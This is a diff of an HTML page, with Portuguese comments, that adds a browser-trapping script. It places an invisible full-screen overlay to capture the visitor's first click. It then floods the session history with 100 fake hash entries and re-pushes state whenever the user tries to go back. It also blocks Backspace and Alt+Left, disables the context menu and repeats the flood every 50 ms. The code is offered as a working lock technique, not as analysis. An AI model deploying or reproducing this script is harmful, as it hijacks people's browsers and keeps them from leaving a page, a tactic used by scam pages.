@@ -3,77 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Página de Bloqueio Robusto</title>
+    <title>Acesso Restrito</title>
     <style>
-        body {
-            background-color: #ffffff;
+        body, html {
             margin: 0;
             padding: 0;
-            height: 100vh;
-            width: 100vw;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
             overflow: hidden;
+            cursor: default;
+        }
+
+        /* Camada invisível que cobre toda a tela para capturar o primeiro clique do usuário */
+        #interaction-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 9999;
+            background: rgba(255, 255, 255, 0.01);
         }
     </style>
 </head>
 <body>
+    <div id="interaction-layer"></div>
+
     <script>
         /**
-         * TÉCNICA AVANÇADA: Hash-Loop e Injeção Massiva de Histórico
-         * Esta técnica utiliza o hash da URL para criar estados de histórico que o navegador
-         * interpreta como "novas páginas", dificultando o retorno à origem real.
+         * ESTRATÉGIA ULTRA-ROBUSTA
+         * 1. Captura de Interação: O usuário fatalmente clicará na tela para tentar interagir.
+         * 2. Inundação de Histórico Imediata: Assim que houver o clique, injetamos 100 estados.
+         * 3. Loop de Localização: Se o usuário tentar sair, o script o força de volta.
          */
 
-        function robustBackLock() {
-            // 1. Inunda o histórico com múltiplos estados diferentes (usando hashes)
-            // Isso cria uma "barreira" de entradas no histórico.
-            for (let i = 0; i < 50; i++) {
-                window.history.pushState({ page: i }, `Etapa ${i}`, window.location.pathname + `#locked-${i}`);
+        const lockURL = window.location.href;
+
+        function applyLock() {
+            // Inunda o histórico massivamente
+            for (let i = 0; i < 100; i++) {
+                window.history.pushState({ locked: true, id: i }, "", lockURL + "#" + Math.random().toString(36).substring(7));
             }
-
-            // 2. Escuta o evento de mudança no histórico
-            window.addEventListener('popstate', function(event) {
-                // Sempre que o usuário tenta voltar, empurra ele de volta para o topo do "muro" de hashes
-                window.history.pushState(null, "", window.location.pathname + `#lock-active-${Date.now()}`);
-                // Força um redirecionamento interno para garantir que o estado seja processado
-                window.location.replace(window.location.pathname + "#main");
-            });
-
-            // 3. Bloqueio de cliques e interações que possam disparar navegação
-            document.addEventListener('click', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-            }, true);
-
-            // 4. Técnica de "Redirecionamento Circular"
-            // Se o navegador conseguir sair do estado atual por algum motivo, 
-            // este intervalo tenta "pescar" o usuário de volta.
-            setInterval(() => {
-                if (!window.location.hash.includes('locked')) {
-                    window.history.pushState(null, "", window.location.pathname + "#re-locked");
-                }
-            }, 100);
-        }
-
-        /**
-         * TÉCNICA DE REDIRECIONAMENTO DE SEGURANÇA
-         * Se o usuário tentar usar o histórico longo (clique direito no botão voltar),
-         * esta técnica tenta invalidar a tentativa.
-         */
-        function forceFocus() {
-            window.onblur = function() {
-                // Tenta recuperar o foco se o usuário interagir com a barra de ferramentas (limitado por segurança)
-                setTimeout(() => window.focus(), 10);
+            
+            // Re-bloqueia no evento de popstate
+            window.onpopstate = function(event) {
+                window.history.pushState(null, "", lockURL + "#" + Date.now());
+                // Força o navegador a permanecer processando a página atual
+                window.location.replace(lockURL + "#main-lock");
             };
         }
 
-        // Execução imediata e contínua
-        (function init() {
-            robustBackLock();
-            forceFocus();
-            
-            // Impede que o usuário veja o menu de contexto (clique direito)
-            document.oncontextmenu = () => false;
-        })();
+        // Tenta aplicar o bloqueio imediatamente (pode falhar em alguns navegadores sem clique)
+        try {
+            applyLock();
+        } catch (e) {}
+
+        // Captura o primeiro clique do usuário para garantir o "User Gesture" exigido pelos navegadores
+        document.getElementById('interaction-layer').addEventListener('click', function() {
+            applyLock();
+            // Remove a camada após o primeiro clique para permitir interações futuras (se houvesse conteúdo)
+            this.style.pointerEvents = 'none';
+        });
+
+        // TÉCNICA DE REDIRECIONAMENTO DE SEGURANÇA (BACK-UP)
+        // Se a URL mudar para algo que não seja a atual, tenta forçar o retorno.
+        window.addEventListener('hashchange', function() {
+            if (!window.location.hash.includes('lock')) {
+                window.history.pushState(null, "", lockURL + "#forced-" + Date.now());
+            }
+        });
+
+        // Bloqueio de teclas de sistema
+        window.addEventListener('keydown', function(e) {
+            // Bloqueia Backspace e Alt + Seta Esquerda
+            if (e.keyCode === 8 || (e.altKey && e.keyCode === 37)) {
+                e.preventDefault();
+            }
+        });
+
+        // Impede menu de contexto
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+        // Reforço contínuo a cada 50ms
+        setInterval(() => {
+            if (window.history.length < 100) {
+                try {
+                    window.history.pushState(null, "", lockURL + "#ref-" + Date.now());
+                } catch(e) {}
+            }
+        }, 50);
     </script>
 </body>
 </html>
